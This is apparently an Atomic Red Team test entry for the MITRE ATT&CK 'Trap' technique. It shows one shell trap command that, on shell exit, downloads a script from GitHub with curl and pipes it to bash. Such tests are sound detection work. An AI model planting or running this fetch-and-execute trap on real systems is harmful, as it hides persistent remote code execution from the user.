# Trap

## MITRE ATT&CK Technique:
[T1154](https://attack.mitre.org/wiki/Technique/T1154)

## Command
    trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Linux/Payloads/echo-art-fish.sh | bash' EXIT

    exit

## After exiting the shell, the script will download and execute.
